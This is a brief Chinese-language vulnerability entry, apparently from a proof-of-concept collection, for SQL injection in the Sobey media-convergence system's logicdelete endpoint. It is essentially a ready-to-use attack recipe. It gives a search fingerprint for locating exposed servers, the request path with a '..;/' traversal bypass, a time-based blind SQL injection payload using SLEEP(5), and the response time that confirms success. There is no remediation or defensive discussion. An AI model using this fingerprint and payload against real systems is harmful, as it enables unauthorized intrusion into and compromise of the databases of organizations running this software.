# 索贝融媒体系统logicdelete存在SQL注入漏洞

索贝融媒体系统 ｜ SQL注入 ｜ —
- **指纹**：`app="SOBEY-融媒体"`
- **请求**：`POST /sobey-mchEditor/js/..;/mch/WXArticleInt/logicdelete HTTP/1.1`

**Payload**
```
siteCode=&id=1 AND (SELECT 2804 FROM (SELECT(SLEEP(5)))MDfc)&token=
```
- **响应特征**：200 响应时间>=5s